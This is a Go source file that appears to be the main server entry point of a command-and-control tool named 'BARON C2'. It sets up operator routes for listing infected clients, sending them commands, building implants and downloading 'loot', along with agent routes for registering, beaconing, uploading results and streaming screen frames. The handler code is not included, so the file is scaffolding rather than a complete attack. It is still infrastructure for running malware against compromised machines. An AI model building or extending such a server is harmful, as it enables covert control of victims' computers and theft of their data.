package main

import (
	"context"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"

	"baron-c2/internal/api"
	"baron-c2/internal/middleware"
	"baron-c2/internal/repo"
	"baron-c2/internal/workers"
	"github.com/gin-gonic/gin"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

func main() {
	// ── Logging ──────────────────────────────────────────────────────────────
	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
	if os.Getenv("GO_ENV") != "production" {
		log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr, TimeFormat: "15:04:05"})
	}

	// ── Database ──────────────────────────────────────────────────────────────
	repo.InitDB()

	// ── WebSocket Hub ────────────────────────────────────────────────────────
	go api.GlobalHub.Run()

	// ── Background Workers ────────────────────────────────────────────────────
	workers.StartOfflineWorker()
	workers.StartTaskCleaner()
	workers.StartMetricsLogger()

	serverURL := os.Getenv("RENDER_EXTERNAL_URL")
	if serverURL == "" {
		serverURL = os.Getenv("SERVER_URL")
	}
	workers.StartKeepAlive(serverURL)

	// ── Gin ───────────────────────────────────────────────────────────────────
	if os.Getenv("GO_ENV") == "production" {
		gin.SetMode(gin.ReleaseMode)
	}
	r := gin.New()
	r.Use(gin.Recovery())
	r.Use(middleware.SecurityMiddleware())

	// ── Panel Routes ──────────────────────────────────────────────────────────
	panel := r.Group("/api/panel")
	{
		panel.POST("/login", api.PanelLogin)
		panel.POST("/admin_action", api.PanelAdmin)
		panel.GET("/check", api.PanelCheck)

		auth := panel.Group("/")
		auth.Use(middleware.AuthRequired())
		{
			auth.GET("/clients", api.PanelClients)
			auth.DELETE("/clients/:id", api.PanelDeleteClient)
			auth.POST("/command", api.PanelCommand)
			auth.POST("/build", api.PanelBuild)
			auth.GET("/download_build", api.PanelDownloadBuild)
			auth.GET("/download_loot", api.PanelDownloadLoot)
		}
	}

	// ── Agent Routes ──────────────────────────────────────────────────────────
	// HMAC middleware applied per-route so register & beacon have different rate limits
	agentGroup := r.Group("/api/agent")
	agentGroup.Use(middleware.AgentHMAC())
	{
		agentGroup.POST("/register", middleware.RegisterRateLimit(), api.AgentRegister)
		agentGroup.POST("/beacon", middleware.BeaconRateLimit(), api.AgentBeacon)
		agentGroup.POST("/result", api.AgentResult)
		agentGroup.POST("/upload", api.AgentUpload)
		agentGroup.POST("/stream_frame", api.AgentStreamFrame)
	}

	// ── Stream & WebSocket ────────────────────────────────────────────────────
	r.POST("/api/stream", api.AgentStream)
	r.GET("/api/agent/stream_ws", api.AgentStreamWS)
	r.GET("/api/panel/stream_ws", api.PanelStreamWS)
	r.GET("/ws", api.WSHandler)
	r.GET("/socket.io/", api.WSHandler)

	// ── Health ────────────────────────────────────────────────────────────────
	r.GET("/api/ping", func(c *gin.Context) {
		if err := repo.Ping(); err != nil {
			c.JSON(http.StatusServiceUnavailable, gin.H{"status": "db_error", "error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, gin.H{"status": "alive"})
	})

	// ── UI ────────────────────────────────────────────────────────────────────
	r.LoadHTMLGlob("templates/*")
	r.GET("/", func(c *gin.Context) {
		c.HTML(http.StatusOK, "index.html", gin.H{})
	})

	// ── Server ────────────────────────────────────────────────────────────────
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	srv := &http.Server{
		Addr:         ":" + port,
		Handler:      r,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 60 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	log.Info().Str("port", port).Msg("BARON C2 starting")

	// Run server in goroutine so we can listen for shutdown signal
	go func() {
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatal().Err(err).Msg("server error")
		}
	}()

	// ── Graceful Shutdown ─────────────────────────────────────────────────────
	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGTERM, syscall.SIGINT)
	<-quit

	log.Info().Msg("shutdown signal received, draining...")

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	if err := srv.Shutdown(ctx); err != nil {
		log.Error().Err(err).Msg("forced shutdown")
	}

	// Close DB
	if sqlDB, err := repo.DB.DB(); err == nil {
		sqlDB.Close()
	}

	log.Info().Msg("BARON C2 stopped cleanly")
}
